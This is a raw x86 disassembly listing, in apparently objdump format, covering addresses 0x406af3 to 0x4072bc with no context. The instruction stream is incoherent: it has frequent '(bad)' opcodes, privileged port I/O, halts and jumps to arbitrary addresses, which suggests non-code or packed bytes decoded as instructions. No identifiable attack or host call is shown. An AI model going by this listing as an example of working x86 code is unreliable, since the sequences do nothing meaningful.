  406af3:	mov    eax,ds:0x7b75bd90
  406af8:	add    eax,0xfcc5ec8f
  406afd:	pop    ss
  406afe:	test   DWORD PTR [edi+0x41],0x6a44cccf
  406b05:	scas   ax,WORD PTR es:[edi]
  406b07:	or     eax,DWORD PTR [eax+0x4e5f8b84]
  406b0d:	and    esp,DWORD PTR [esi+ebp*1]
  406b10:	test   eax,0x5e6457f2
  406b15:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406b16:	(bad)  
  406b17:	or     eax,eax
  406b19:	mov    al,ds:0xe450f7e3
  406b1e:	gs int3 
  406b20:	xchg   ecx,eax
  406b21:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406b22:	sub    BYTE PTR [edx+0x5a],dl
  406b25:	mov    esp,0xf52367c5
  406b2a:	mov    esi,0x3f3f0213
  406b2f:	loope  0x406b66
  406b31:	sub    bh,BYTE PTR [esi-0x39]
  406b34:	inc    ecx
  406b35:	dec    edi
  406b36:	and    esi,edx
  406b38:	add    BYTE PTR [eax+0x38],ch
  406b3b:	pop    ss
  406b3c:	or     eax,0xebeb6d92
  406b41:	ror    DWORD PTR [edx-0x43],1
  406b44:	inc    esp
  406b45:	jbe    0x406b5c
  406b47:	(bad)  
  406b48:	cld    
  406b49:	jmp    0xd4352db9
  406b4e:	push   ds
  406b4f:	adc    BYTE PTR [eax+ecx*2],dl
  406b52:	add    DWORD PTR [ebp-0x6d],0xffffffc1
  406b56:	enter  0x3f64,0x2c
  406b5a:	jb     0x406ae3
  406b5c:	pop    es
  406b5d:	push   ss
  406b5e:	mov    bh,0xf6
  406b60:	call   0x1392afbc
  406b65:	or     eax,0xa0836436
  406b6a:	call   0x56d0ed36
  406b6f:	fisttp WORD PTR [esi-0x7992478d]
  406b75:	mov    al,0xb6
  406b77:	pop    ss
  406b78:	xchg   ebp,eax
  406b79:	clc    
  406b7a:	jmp    0x91c9e727
  406b7f:	cdq    
  406b80:	(bad)  
  406b81:	xor    eax,0x8e90be00
  406b86:	out    dx,al
  406b87:	div    ebx
  406b89:	dec    ebx
  406b8a:	pop    ebp
  406b8b:	add    dh,bh
  406b8d:	pushf  
  406b8e:	not    BYTE PTR [ecx]
  406b90:	out    dx,eax
  406b91:	addr16 aam 0x25
  406b94:	or     bl,bh
  406b96:	out    0xa5,eax
  406b98:	sbb    ebp,DWORD PTR [eax+0x7e]
  406b9b:	jmp    ecx
  406b9d:	jp     0x406b8b
  406b9f:	jge    0x406b27
  406ba1:	lock fld DWORD PTR [di+0xb9b]
  406ba7:	push   ds
  406ba8:	dec    ebp
  406ba9:	lahf   
  406baa:	sbb    dl,BYTE PTR [esi-0x13e56a57]
  406bb0:	push   0x24
  406bb2:	aam    0x1d
  406bb4:	dec    eax
  406bb5:	outs   dx,DWORD PTR ds:[esi]
  406bb6:	lea    ebx,ds:0xc8fd34de
  406bbc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406bbd:	into   
  406bbe:	daa    
  406bbf:	push   es
  406bc0:	cmp    DWORD PTR [ebx+0x251a8811],0x85cead2e
  406bca:	aaa    
  406bcb:	or     al,0xc4
  406bcd:	xor    dl,BYTE PTR cs:[edi*1+0x785b0fbf]
  406bd5:	mov    ds:0x3da0198a,eax
  406bda:	dec    esi
  406bdb:	add    ebp,DWORD PTR [edi-0x5a]
  406bde:	aad    0x53
  406be0:	jne    0x406c28
  406be2:	add    eax,0x559dec32
  406be7:	mov    al,ds:0x59db4556
  406bec:	jns    0x406c1d
  406bee:	lahf   
  406bef:	cmp    BYTE PTR [edx+0x622151d3],dh
  406bf5:	dec    ebx
  406bf6:	push   edi
  406bf7:	and    al,0xda
  406bf9:	loopne 0x406c32
  406bfb:	inc    ebx
  406bfc:	enter  0x4859,0x6a
  406c00:	ret    0xf63c
  406c03:	or     DWORD PTR [edx-0x4926b0ba],ebp
  406c09:	adc    al,BYTE PTR [ecx+0x35]
  406c0c:	pushf  
  406c0d:	add    BYTE PTR [ecx-0x208a121f],bh
  406c13:	xor    al,0xc5
  406c15:	fimul  DWORD PTR [edi-0x1c]
  406c18:	mov    dl,0xb1
  406c1a:	inc    ebx
  406c1b:	push   ebp
  406c1c:	test   al,0x2
  406c1e:	jnp    0x737ec167
  406c24:	in     al,0xcc
  406c26:	paddsw mm2,QWORD PTR [esi+0x67]
  406c2a:	out    0xfe,al
  406c2c:	push   ds
  406c2d:	mov    dh,BYTE PTR [edi]
  406c2f:	xor    ebp,edi
  406c31:	inc    ebx
  406c32:	(bad)  
  406c33:	or     ch,BYTE PTR [ecx-0x77]
  406c36:	mov    al,ah
  406c38:	push   ss
  406c39:	cs sub dh,dh
  406c3c:	inc    edx
  406c3d:	lahf   
  406c3e:	adc    dl,BYTE PTR [edi-0x757faa7c]
  406c44:	jmp    0x406c27
  406c46:	xchg   ebp,eax
  406c47:	jae    0x406c49
  406c49:	retf   
  406c4a:	popf   
  406c4b:	or     BYTE PTR [edi],0x5e
  406c4e:	push   es
  406c4f:	inc    esp
  406c50:	push   esp
  406c51:	psrad  mm7,QWORD PTR [edi+edi*2-0x52b221b6]
  406c59:	enter  0x4826,0x1e
  406c5d:	std    
  406c5e:	mov    cl,0xe5
  406c60:	xchg   DWORD PTR [edx],esi
  406c62:	lock and eax,eax
  406c65:	fst    DWORD PTR [edi+0x23]
  406c68:	outs   dx,BYTE PTR ds:[esi]
  406c69:	arpl   bx,dx
  406c6b:	lock stc 
  406c6d:	sub    DWORD PTR [ebp-0x57],edi
  406c70:	pop    ss
  406c71:	icebp  
  406c72:	test   al,0xb0
  406c74:	cwde   
  406c75:	adc    esp,edi
  406c77:	lods   al,BYTE PTR ds:[esi]
  406c78:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406c79:	xchg   esi,eax
  406c7a:	in     al,dx
  406c7b:	lds    edi,FWORD PTR [edi]
  406c7d:	push   es
  406c7e:	cmc    
  406c7f:	mov    eax,fs:0xcfd4b29c
  406c85:	(bad)  
  406c87:	lods   al,BYTE PTR ds:[esi]
  406c88:	ins    BYTE PTR es:[edi],dx
  406c89:	inc    eax
  406c8a:	out    0x85,al
  406c8c:	dec    ebx
  406c8d:	rol    DWORD PTR [ebx],cl
  406c8f:	jl     0x406cb3
  406c91:	(bad)  
  406c92:	out    0x44,eax
  406c94:	add    eax,0x1b80fa08
  406c99:	sar    DWORD PTR [eax-0x3ab6047],cl
  406c9f:	iret   
  406ca0:	inc    ebp
  406ca1:	sub    BYTE PTR [ecx],0x7d
  406ca4:	dec    ebp
  406ca5:	inc    ecx
  406ca6:	inc    eax
  406ca7:	call   0x9d411692
  406cac:	imul   edx,DWORD PTR [esp+esi*2-0x1d],0xb7e12605
  406cb4:	stos   DWORD PTR es:[edi],eax
  406cb5:	test   BYTE PTR [eax],ch
  406cb7:	push   es
  406cb8:	pop    edx
  406cb9:	or     ch,BYTE PTR [esi+0x79ccd0a1]
  406cbf:	bound  ecx,QWORD PTR [ebp+0x2c]
  406cc2:	adc    BYTE PTR fs:0x610b6573,al
  406cc9:	jmp    0xeb97d974
  406cce:	(bad)  
  406cd0:	pop    ds
  406cd1:	xor    al,0x0
  406cd3:	push   esi
  406cd4:	mov    esi,0x9d81ccf0
  406cd9:	cmp    eax,DWORD PTR [ebx+ebp*4+0x1f07d4d3]
  406ce0:	mov    ah,0x17
  406ce2:	jmp    0x1f6c10a4
  406ce7:	out    dx,eax
  406ce8:	(bad)  
  406cea:	push   0xffffffef
  406cec:	adc    bh,bl
  406cee:	xchg   ebp,eax
  406cef:	mov    al,0x5b
  406cf1:	fwait
  406cf2:	sbb    BYTE PTR [eax],dh
  406cf4:	push   eax
  406cf5:	sbb    cl,0x5a
  406cf8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406cf9:	ret    
  406cfa:	mov    edx,0x6c54476a
  406cff:	or     ebp,0x2c
  406d02:	mov    dl,0xdf
  406d04:	popf   
  406d05:	xchg   edx,eax
  406d06:	jg     0x406d15
  406d08:	mov    eax,0x6f282182
  406d0d:	es sub ecx,ebp
  406d10:	mov    cl,0x98
  406d12:	sub    DWORD PTR [esi],edx
  406d14:	lock inc ecx
  406d16:	(bad)  [edi]
  406d18:	lods   eax,DWORD PTR ds:[esi]
  406d19:	out    0x3e,al
  406d1b:	out    dx,al
  406d1c:	add    al,0x43
  406d1e:	sbb    dh,BYTE PTR [esi]
  406d20:	cld    
  406d21:	mov    BYTE PTR [ebx+0x3ee90d01],dl
  406d27:	pop    ecx
  406d28:	inc    esi
  406d29:	cmp    eax,0x2daef190
  406d2e:	xor    esi,DWORD PTR [edi]
  406d30:	leave  
  406d31:	pop    ebx
  406d32:	retf   0x8d4
  406d35:	xchg   DWORD PTR [edx-0x4eed2a67],esp
  406d3b:	out    dx,al
  406d3c:	cmp    edi,eax
  406d3e:	adc    eax,0xf2d14180
  406d43:	jle    0x406d75
  406d45:	dec    esi
  406d46:	gs xor al,0x95
  406d49:	lds    ebx,FWORD PTR [eax]
  406d4b:	(bad)  
  406d4c:	and    ah,BYTE PTR [edx]
  406d4e:	add    eax,0x5fce237b
  406d53:	es pop es
  406d55:	mov    eax,0x16ab6bff
  406d5a:	xlat   BYTE PTR ds:[ebx]
  406d5b:	mov    esi,0x369142e5
  406d60:	cmp    BYTE PTR [edi+0x35071e43],dl
  406d66:	dec    ebp
  406d67:	push   cs
  406d68:	push   eax
  406d69:	stc    
  406d6a:	rcr    BYTE PTR [eax],cl
  406d6c:	int3   
  406d6d:	cmp    eax,0x98221167
  406d72:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406d73:	retf   0x5fb7
  406d76:	bnd jno 0x406d26
  406d79:	cdq    
  406d7a:	adc    al,0x2a
  406d7c:	fwait
  406d7d:	xchg   esi,eax
  406d7e:	arpl   WORD PTR [esp+ecx*1],dx
  406d81:	test   eax,0x318f2dce
  406d86:	sbb    ecx,DWORD PTR [ebx]
  406d88:	push   esp
  406d89:	cmp    ebp,DWORD PTR [ecx+ebp*4+0x24]
  406d8d:	aam    0x83
  406d8f:	dec    eax
  406d90:	mov    bl,BYTE PTR [ebx+0x1b]
  406d93:	loop   0x406d39
  406d95:	pop    edi
  406d96:	fcomp  QWORD PTR [ecx-0x7a24897b]
  406d9c:	gs mov eax,0x1e7940f7
  406da2:	xlat   BYTE PTR ds:[ebx]
  406da3:	jno    0x406d33
  406da5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406da6:	bound  ebx,QWORD PTR [edi+0x7]
  406da9:	pop    edi
  406daa:	add    BYTE PTR [esi],dh
  406dac:	dec    esi
  406dad:	jmp    0x79e7:0xfd20992
  406db4:	aam    0xac
  406db6:	push   esi
  406db7:	cmp    eax,0xd59503ba
  406dbc:	dec    eax
  406dbd:	push   es
  406dbe:	mov    bh,0x97
  406dc0:	xchg   esi,eax
  406dc1:	inc    ebp
  406dc2:	mov    BYTE PTR [esi],bl
  406dc4:	or     BYTE PTR [edx+0x213fe857],0x7c
  406dcb:	lahf   
  406dcc:	and    ch,al
  406dce:	sub    bl,BYTE PTR [edx-0x6004d04b]
  406dd4:	add    BYTE PTR [eax+0x7eefe4df],0x3f
  406ddb:	mov    eax,ds:0xa1aa1fed
  406de0:	repnz scas al,BYTE PTR es:[edi]
  406de2:	dec    esi
  406de3:	jl     0x406e3a
  406de5:	cli    
  406de6:	iret   
  406de7:	sahf   
  406de8:	push   0x2e
  406dea:	xchg   edx,eax
  406deb:	call   0x66c3:0x3903a26c
  406df2:	add    BYTE PTR [ebx-0x6d67a15],al
  406df8:	sahf   
  406df9:	mov    ds:0x2ba67ee6,eax
  406dfe:	xlat   BYTE PTR ds:[ebx]
  406dff:	fwait
  406e00:	mov    ecx,DWORD PTR [edx-0x4a42fed1]
  406e06:	or     DWORD PTR [edx],edx
  406e08:	scas   eax,DWORD PTR es:[edi]
  406e09:	or     ah,BYTE PTR [edx-0x27]
  406e0c:	ins    BYTE PTR es:[edi],dx
  406e0d:	and    ebp,edx
  406e0f:	mov    ah,0xf8
  406e11:	loope  0x406e3a
  406e13:	and    eax,0x624b8f0b
  406e18:	jno    0x406e6a
  406e1a:	inc    edx
  406e1b:	das    
  406e1c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406e1d:	and    DWORD PTR [edi+0x51],0xffffffbb
  406e21:	xlat   BYTE PTR ds:[ebx]
  406e22:	add    edx,esp
  406e24:	mov    BYTE PTR ds:[esi+0x2],cl
  406e28:	push   ecx
  406e29:	pop    esp
  406e2a:	retf   
  406e2b:	popa   
  406e2c:	jns    0x406dc8
  406e2e:	sbb    al,0xad
  406e30:	test   DWORD PTR [ecx+ecx*8],edi
  406e33:	add    eax,0x675180de
  406e38:	or     BYTE PTR [ecx],bh
  406e3a:	daa    
  406e3b:	mov    edi,0x514b55f6
  406e40:	jg     0x406de0
  406e42:	stos   BYTE PTR es:[edi],al
  406e43:	pop    ss
  406e44:	mov    cl,0x93
  406e46:	mov    ebx,0xf67fe64
  406e4b:	pop    esi
  406e4c:	xchg   ebp,eax
  406e4d:	mov    cl,0x2
  406e4f:	test   esp,edi
  406e51:	mov    al,0x6c
  406e53:	mov    dl,BYTE PTR [ebx-0x7ef6a9fa]
  406e59:	mov    eax,ds:0x12b60daa
  406e5e:	stos   BYTE PTR es:[edi],al
  406e5f:	push   ebx
  406e60:	mov    DWORD PTR [edi+0x643682b9],esp
  406e66:	cmp    BYTE PTR [edi-0xf],dl
  406e69:	pop    ecx
  406e6a:	dec    ecx
  406e6b:	in     al,0x21
  406e6d:	xlat   BYTE PTR ds:[ebx]
  406e6e:	push   ebx
  406e6f:	adc    cl,BYTE PTR ds:0x789bd572
  406e75:	jo     0x406ecd
  406e77:	enter  0x6095,0x48
  406e7b:	jp     0x406e4c
  406e7d:	mov    esi,0x3bf43c0f
  406e82:	shl    BYTE PTR [esi],1
  406e84:	or     BYTE PTR [edx-0x4f],cl
  406e87:	ins    BYTE PTR es:[edi],dx
  406e88:	mov    BYTE PTR [esi+ecx*4+0x51d64bfe],al
  406e8f:	push   edx
  406e90:	inc    ecx
  406e91:	clc    
  406e92:	cmp    DWORD PTR [esi],edi
  406e94:	(bad)  
  406e95:	out    dx,eax
  406e96:	add    cl,BYTE PTR [esi+0x38b8713]
  406e9c:	mov    ah,0x97
  406e9e:	ret    0x911c
  406ea1:	aaa    
  406ea2:	hlt    
  406ea3:	int3   
  406ea4:	inc    edx
  406ea5:	test   eax,0xbd5043fb
  406eaa:	shl    BYTE PTR [esi+ebp*2],0x96
  406eae:	out    dx,eax
  406eaf:	mov    al,ds:0xacbab982
  406eb4:	jg     0x406f14
  406eb6:	xchg   BYTE PTR [edi+0x56071def],bl
  406ebc:	push   cs
  406ebd:	lea    esp,[eax-0x130ae908]
  406ec3:	das    
  406ec4:	dec    ebp
  406ec5:	mov    BYTE PTR [ecx+0x0],al
  406ec8:	scas   eax,DWORD PTR es:[edi]
  406ec9:	inc    esi
  406eca:	jno    0x406f2a
  406ecc:	mov    al,0x74
  406ece:	mov    bh,0xce
  406ed0:	cmp    BYTE PTR [edx],0x87
  406ed3:	int    0xd6
  406ed5:	and    bl,BYTE PTR [ebp-0x2bec7932]
  406edb:	xchg   BYTE PTR [eax+0x62],bh
  406ede:	xorps  xmm6,XMMWORD PTR [ecx-0x6e0e2e83]
  406ee5:	outs   dx,DWORD PTR ds:[esi]
  406ee6:	sub    BYTE PTR ds:0x76d0d61d,0xb8
  406eed:	popf   
  406eee:	enter  0xa0c3,0xb4
  406ef2:	repnz push ebp
  406ef4:	rol    DWORD PTR [edi+ebp*4],1
  406ef7:	mov    dl,0xa1
  406ef9:	xchg   esi,eax
  406efa:	data16 cli 
  406efc:	push   ax
  406efe:	xor    esi,0xffffffc5
  406f01:	rcr    DWORD PTR [edi-0x57],cl
  406f04:	aam    0xb7
  406f06:	push   edi
  406f07:	inc    eax
  406f08:	pop    edi
  406f09:	popf   
  406f0a:	in     al,dx
  406f0b:	and    ch,0xa3
  406f0e:	lock jmp 0x406efc
  406f11:	sub    eax,0xbd22fea
  406f16:	jmp    0xe5c962e9
  406f1b:	push   eax
  406f1c:	add    al,0xf8
  406f1e:	out    0xea,eax
  406f20:	xor    eax,0x2fed049b
  406f25:	rcr    DWORD PTR [edx-0x18],1
  406f28:	mov    ebp,0x32e46774
  406f2d:	loopne 0x406f7b
  406f2f:	ds repnz mov bl,0xf8
  406f33:	aas    
  406f34:	fld    DWORD PTR [edi]
  406f36:	jns    0x406f9e
  406f38:	std    
  406f39:	cmc    
  406f3a:	adc    ebp,DWORD PTR [edx]
  406f3c:	dec    eax
  406f3d:	hlt    
  406f3e:	mov    ecx,0xcfa68009
  406f43:	cdq    
  406f44:	fist   WORD PTR [edx+0x13f0571c]
  406f4a:	stos   DWORD PTR es:[edi],eax
  406f4b:	lods   eax,DWORD PTR ds:[esi]
  406f4c:	xchg   edi,eax
  406f4d:	loope  0x406f3f
  406f4f:	fst    DWORD PTR [edx+0x48]
  406f52:	or     edx,DWORD PTR [eax-0x75]
  406f55:	ret    
  406f56:	jbe    0x406f51
  406f58:	loope  0x406f25
  406f5a:	call   0xb54f0653
  406f5f:	iret   
  406f60:	push   0xc6613efe
  406f65:	lahf   
  406f66:	loop   0x406f43
  406f68:	repnz pusha 
  406f6a:	or     BYTE PTR fs:[ecx-0x3aeaa248],0xd8
  406f72:	ja     0x406f15
  406f74:	aas    
  406f75:	adc    BYTE PTR [edi+0x5],dh
  406f78:	cs pop ebp
  406f7a:	push   esi
  406f7b:	hlt    
  406f7c:	push   0xd
  406f7e:	lods   eax,DWORD PTR ds:[esi]
  406f7f:	stos   DWORD PTR es:[edi],eax
  406f80:	retf   0x5c19
  406f83:	test   al,0x63
  406f85:	fsubr  QWORD PTR [ebx-0x225f02d5]
  406f8b:	rcr    BYTE PTR [edi],1
  406f8d:	arpl   WORD PTR [ecx],bp
  406f8f:	or     DWORD PTR [eax+ebx*1-0x7b4122b2],esi
  406f96:	xor    DWORD PTR [ecx-0x6ce46b6],ebx
  406f9c:	push   ss
  406f9d:	and    ah,BYTE PTR [ebp-0x7d]
  406fa0:	adc    dh,BYTE PTR [esp+eiz*2-0x1a2a803b]
  406fa7:	aas    
  406fa8:	lock es or al,0x1e
  406fac:	mov    al,ds:0x171668bf
  406fb1:	adc    DWORD PTR ds:0xc3157744,edx
  406fb7:	sbb    bl,dl
  406fb9:	mov    ecx,DWORD PTR [edi]
  406fbb:	push   edx
  406fbc:	ret    
  406fbd:	in     eax,dx
  406fbe:	add    eax,0x87282024
  406fc3:	loopne 0x406fc2
  406fc5:	and    DWORD PTR [ebx+0x7edb63ee],eax
  406fcb:	call   eax
  406fcd:	adc    al,0xbd
  406fcf:	lods   al,BYTE PTR ds:[esi]
  406fd0:	inc    ebx
  406fd1:	mov    ds:0xfe3f227d,eax
  406fd6:	dec    esi
  406fd7:	inc    ebx
  406fd8:	or     al,bl
  406fda:	icebp  
  406fdb:	ret    
  406fdc:	cmc    
  406fdd:	imul   ax,WORD PTR [esp+ecx*8+0x52],0x7aa2
  406fe4:	adc    dl,BYTE PTR [ecx]
  406fe6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406fe7:	out    dx,al
  406fe8:	cdq    
  406fe9:	add    BYTE PTR [eax-0x72],bl
  406fec:	or     DWORD PTR [eax-0x5624cb29],edx
  406ff2:	or     dh,BYTE PTR [edx]
  406ff4:	jne    0x406f7f
  406ff6:	xchg   ecx,eax
  406ff7:	xchg   esi,eax
  406ff8:	lea    ebp,[edx]
  406ffa:	sub    ebx,DWORD PTR ds:0x6c951ea1
  407000:	jl     0x40703e
  407002:	inc    ebp
  407003:	sbb    al,0x32
  407005:	in     al,dx
  407006:	add    esp,DWORD PTR [ebx-0x50fbd0a5]
  40700c:	jmp    0x407068
  40700e:	jmp    0xa125d44
  407013:	idiv   DWORD PTR [esi]
  407015:	push   es
  407016:	jb     0x407051
  407018:	jb     0x406ff0
  40701a:	pushf  
  40701b:	sar    BYTE PTR [ebp+0x22],cl
  40701e:	push   ebx
  40701f:	xor    al,0x56
  407021:	inc    ebp
  407022:	nop
  407023:	jno    0x407073
  407025:	push   cs
  407026:	(bad)  
  407027:	jbe    0x40707b
  407029:	ins    DWORD PTR es:[edi],dx
  40702a:	add    BYTE PTR [eax-0x12],cl
  40702d:	push   esi
  40702e:	add    eax,0x7bd2395c
  407033:	aam    0x9a
  407035:	push   ebx
  407036:	jp     0x40706d
  407038:	cmp    al,0x67
  40703a:	push   DWORD PTR ss:[esp+esi*2]
  40703e:	outs   dx,DWORD PTR ds:[esi]
  40703f:	mov    eax,0xd33cbef5
  407044:	lahf   
  407045:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407046:	ficomp DWORD PTR [edi]
  407048:	test   al,0x3a
  40704a:	push   edx
  40704b:	mov    edi,0x133f71db
  407050:	stc    
  407051:	(bad)  
  407052:	cmc    
  407053:	inc    ebx
  407054:	cmc    
  407055:	adc    DWORD PTR [ebx-0x56],eax
  407058:	popa   
  407059:	push   eax
  40705a:	fadd   QWORD PTR [edx-0x43a6eca7]
  407060:	xor    edx,DWORD PTR [ecx-0x2e77a7e0]
  407066:	mov    eax,ds:0xead86dc1
  40706b:	(bad)  
  40706c:	out    0x6f,al
  40706e:	jecxz  0x407055
  407070:	jmp    0xacf5:0x14791f1f
  407077:	leave  
  407078:	hlt    
  407079:	sub    ebp,esp
  40707b:	les    ecx,FWORD PTR [edx+esi*1+0x7426100f]
  407082:	mov    DWORD PTR [ecx],eax
  407084:	sub    ebp,DWORD PTR [esi+0x7d]
  407087:	xor    ah,BYTE PTR [eax+0x3c93cbe6]
  40708d:	rol    BYTE PTR [ecx],cl
  40708f:	ds leave 
  407091:	mov    ecx,0x3285c3c8
  407096:	mov    ebp,0x73aac89
  40709b:	(bad)  [ecx-0x75]
  40709e:	xchg   ecx,eax
  40709f:	pop    ecx
  4070a0:	mov    al,ds:0x7b2498ac
  4070a5:	stos   DWORD PTR es:[edi],eax
  4070a6:	and    BYTE PTR [ecx],0xf1
  4070a9:	es or  al,0x19
  4070ac:	sbb    al,0xc6
  4070ae:	sbb    dl,bl
  4070b0:	sbb    dl,BYTE PTR [ebp+0x61d20c96]
  4070b6:	in     eax,dx
  4070b7:	cli    
  4070b8:	cs jae 0x407090
  4070bb:	push   ebp
  4070bc:	in     al,0x53
  4070be:	shr    BYTE PTR [eax-0xb660661],0xa9
  4070c5:	nop
  4070c6:	loop   0x407101
  4070c8:	and    eax,0x8e582171
  4070cd:	out    dx,eax
  4070ce:	xchg   edi,eax
  4070cf:	dec    esp
  4070d0:	fucom  st(6)
  4070d2:	mov    bl,0x5d
  4070d4:	push   ss
  4070d5:	and    al,0xf2
  4070d7:	nop
  4070d8:	int    0xff
  4070da:	test   DWORD PTR [ebx-0x2e],ebp
  4070dd:	mov    ah,0x36
  4070df:	retf   
  4070e0:	sbb    BYTE PTR [ebp+0x3866648c],dh
  4070e6:	enter  0xb8,0x75
  4070ea:	aam    0x5f
  4070ec:	fwait
  4070ed:	int    0xd7
  4070ef:	retf   
  4070f0:	adc    DWORD PTR [ebp-0x7f],edx
  4070f3:	xor    dl,BYTE PTR [ecx]
  4070f5:	into   
  4070f6:	push   edx
  4070f7:	dec    edi
  4070f8:	xchg   cl,ch
  4070fa:	sbb    esi,DWORD PTR [esi-0x9e110ad]
  407100:	shl    ecx,cl
  407102:	pop    ebp
  407103:	mov    ebx,0x6015b16c
  407108:	dec    eax
  407109:	scas   eax,DWORD PTR es:[edi]
  40710a:	ss ins DWORD PTR es:[edi],dx
  40710c:	dec    edx
  40710d:	fild   WORD PTR [ebx]
  40710f:	pushf  
  407110:	std    
  407111:	pop    ecx
  407112:	xlat   BYTE PTR ds:[ebx]
  407113:	shr    BYTE PTR [ebp-0x76d12a5],0xd3
  40711a:	lods   eax,DWORD PTR ds:[esi]
  40711b:	add    ah,0x2c
  40711e:	jge    0x40710c
  407120:	ret    0x986
  407123:	adc    bl,bh
  407125:	or     DWORD PTR [edi+0x2938b61f],edx
  40712b:	iret   
  40712c:	cmp    eax,0x86c19588
  407131:	push   ecx
  407132:	cld    
  407133:	or     al,0xe4
  407135:	aas    
  407136:	popa   
  407137:	push   0xa9a2a3de
  40713c:	push   es
  40713d:	hlt    
  40713e:	js     0x407188
  407140:	das    
  407141:	xor    DWORD PTR [ebx-0x6e740d4e],0xffffffad
  407148:	pop    eax
  407149:	or     eax,0xa312aac7
  40714e:	ins    BYTE PTR es:[edi],dx
  40714f:	or     bl,BYTE PTR [edx+0x17dc99d3]
  407155:	test   DWORD PTR [eax+0x2c40c236],eax
  40715b:	push   cs
  40715c:	ja     0x407102
  40715e:	iret   
  40715f:	leave  
  407160:	mov    edi,0xa052418d
  407165:	and    ch,BYTE PTR [eax-0x62]
  407168:	mov    edi,0x4fd90075
  40716d:	and    eax,0x60f01100
  407172:	or     dl,BYTE PTR [edi]
  407174:	adc    BYTE PTR [eax-0x8],ah
  407177:	jmp    0x870733f1
  40717c:	jl     0x4071cf
  40717e:	cmp    BYTE PTR [ebx+eiz*8-0x29],0x11
  407183:	stos   BYTE PTR es:[edi],al
  407184:	not    DWORD PTR [esi+0x1d6b088f]
  40718a:	jmp    0x407174
  40718c:	lods   al,BYTE PTR ds:[esi]
  40718d:	aam    0x16
  40718f:	push   0xffffff88
  407191:	fsqrt  
  407193:	jno    0x40715b
  407195:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407196:	aas    
  407197:	dec    ecx
  407198:	dec    ebp
  407199:	push   edi
  40719a:	lds    ebx,FWORD PTR gs:[ebx+0x5]
  40719e:	pop    ecx
  40719f:	enter  0xe88,0x8e
  4071a3:	aam    0x8c
  4071a5:	sub    eax,0xee736854
  4071aa:	std    
  4071ab:	imul   BYTE PTR ds:0xcd143afd
  4071b1:	addr16 add eax,0x24c89d24
  4071b7:	mov    ecx,DWORD PTR [ecx+0x21]
  4071ba:	inc    ebx
  4071bb:	rol    esp,0xb1
  4071be:	test   eax,0x4e9934f2
  4071c3:	and    al,al
  4071c5:	fidivr WORD PTR [eax-0x35]
  4071c8:	push   edx
  4071c9:	jnp    0x4071a1
  4071cb:	fild   QWORD PTR [ebp-0x507d1277]
  4071d1:	jns    0x40721f
  4071d3:	fisttp QWORD PTR [eax]
  4071d5:	sbb    edi,DWORD PTR [esi-0x533f923a]
  4071db:	ret    
  4071dc:	fst    st(3)
  4071de:	xchg   ecx,eax
  4071df:	idiv   DWORD PTR [ebx]
  4071e1:	mov    bh,0xa6
  4071e3:	dec    ecx
  4071e4:	cli    
  4071e5:	mov    cl,0xd1
  4071e7:	or     DWORD PTR [edx+0x477f24c9],edx
  4071ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4071ee:	(bad)  
  4071ef:	neg    BYTE PTR [eax-0x5a989c48]
  4071f5:	popf   
  4071f6:	pop    ebx
  4071f7:	or     BYTE PTR [ebx-0x565c9090],ah
  4071fd:	mov    dl,0xe
  4071ff:	(bad)  [ebx-0x79e9f5bd]
  407205:	sub    dh,ch
  407207:	adc    DWORD PTR [edi-0x50],edx
  40720a:	jmp    0x47:0xf5a8e3c5
  407211:	mov    cl,0x6e
  407213:	inc    ebp
  407214:	fild   DWORD PTR [ebx]
  407216:	dec    edx
  407217:	int3   
  407218:	push   es
  407219:	vaddss xmm4,xmm4,xmm0
  40721d:	add    eax,0xc4a99dab
  407222:	pushf  
  407223:	pop    ebx
  407224:	sbb    DWORD PTR [ecx-0x6c13de95],eax
  40722a:	js     0x407272
  40722c:	dec    esi
  40722d:	std    
  40722e:	pop    ebx
  40722f:	dec    ebp
  407230:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407231:	adc    eax,0xfba11392
  407236:	inc    ebx
  407237:	pop    esp
  407238:	push   ecx
  407239:	cmp    eax,0xf420d172
  40723e:	sbb    al,BYTE PTR [esi+0x2a]
  407241:	repnz or eax,ecx
  407244:	aas    
  407245:	cld    
  407246:	in     al,dx
  407247:	outs   dx,BYTE PTR ds:[esi]
  407248:	fstp   TBYTE PTR [edi-0x4f]
  40724b:	mov    ebx,0xb36f1070
  407250:	lock and eax,0x99911c18
  407256:	jl     0x407271
  407258:	sub    eax,eax
  40725a:	stc    
  40725b:	pop    ebp
  40725c:	in     eax,0xf1
  40725e:	push   es
  40725f:	jo     0x407247
  407261:	aaa    
  407262:	inc    edi
  407263:	mov    cl,0x4d
  407265:	jb     0x4072a4
  407267:	mov    ebp,0x1c31e43c
  40726c:	js     0x407220
  40726e:	out    dx,al
  40726f:	mov    eax,0x94eeda48
  407274:	ror    al,cl
  407276:	adc    al,0x10
  407278:	rcl    BYTE PTR [ebx+0x27d3a9b4],0x8b
  40727f:	shl    DWORD PTR [esi-0x1c],0x97
  407283:	push   esi
  407284:	xor    eax,DWORD PTR [edi-0x1f]
  407287:	imul   edi,DWORD PTR [ecx],0x3e
  40728a:	cmc    
  40728b:	(bad)  
  40728c:	sahf   
  40728d:	bound  esi,QWORD PTR [ebp+edi*2+0x40488ace]
  407294:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407295:	(bad)  
  407296:	clc    
  407297:	sahf   
  407298:	(bad)  
  40729a:	sbb    esi,eax
  40729c:	add    BYTE PTR [esi],ch
  40729e:	pop    eax
  40729f:	add    cl,bl
  4072a1:	jae    0x4072ba
  4072a3:	pop    edi
  4072a4:	adc    eax,0x2aa96af1
  4072a9:	mov    ecx,0xba474b85
  4072ae:	(bad)  
  4072af:	mov    ebp,0xc5423e3b
  4072b4:	and    eax,0x4baea8f4
  4072b9:	or     cl,BYTE PTR [esp+ebx*1]
  4072bc:	adc    dl,bh
